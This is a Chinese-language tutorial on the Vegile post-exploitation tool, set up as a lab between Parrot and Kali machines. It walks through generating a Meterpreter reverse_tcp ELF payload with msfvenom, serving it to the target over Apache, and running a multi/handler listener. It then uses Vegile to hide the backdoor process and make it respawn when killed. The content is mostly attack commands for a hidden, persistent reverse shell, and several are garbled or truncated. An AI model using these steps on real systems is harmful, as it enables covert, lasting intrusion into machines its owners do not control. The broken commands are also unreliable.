1.  工具介绍   
    
    Vegile是用于linux系统后渗透测试中的权限维持。Vegile这个工具将设置一个后门/rootkit，并且这个后门会直接隐藏spesisifc进程，无限连接metesploit,持续维持你的Metepreter会话，即使木马进程被杀死，它依然会再次重新运行，换句话说是该进程无限循环的。

1.  工具使用-模拟实验  
    
    实验器材：Parrot虚拟机、Kali虚拟机、Vegile 、Metasploit
    

*   \[1\] 第一步：在靶机上clone下工具
    

> ```
> git 
> ```

  

![](../Images/0d7274490e0e54408bab99e08697376f.png)

  

第二步：在攻击机生成Payload

  

> msfVENOM -p linux/x86/meterpreter/reverse\_tcp LHOST=攻击机IP LPORT=自
> 
> 定义监听端口 -b "\\x80" -f elf -o test

  

![](../Images/63402865ea0bdaeaaea8372de41360da.png)

  

第三步：攻击机启动Apache，靶机上下载Payload

> ```
> servie apache2 start
> cp 
> ```

  

![](../Images/56e23e08466489775a80cd7db3281537.png)

  

\[4\]启动Metasploit，开启监听

  

> msfconsoleuse explot/multi/handerset lhost 监听ip 我这里是192.168.8.158s
> 
> et lport 监听端口 我这里是8888exploit -j

  

![](../Images/8d16914cc587224b6bcc762b0b50ecb3.png)

  

\[5\] 构造后门

  

> chmod +x testchmod +x Vegile 赋予权限

  

查看帮助

  

> /Vegile \--h./Vegile \--i  隐藏你的后门./Vegile \--u 无限复制你的metasploi
> 
> t会话，即使他被kill，依然可以再次运行

  

![](../Images/5ac05b48679a420dea0522199f3ce71d.png)

  

植入后门

```
Vegile 
```

这里可以看到已经反弹会话了，我们kill掉

> sessions -k 7

  

![](../Images/d7b2bdad5affd2b7714e09cf55b65dc0.png)

  

> exploit -j  重新监听
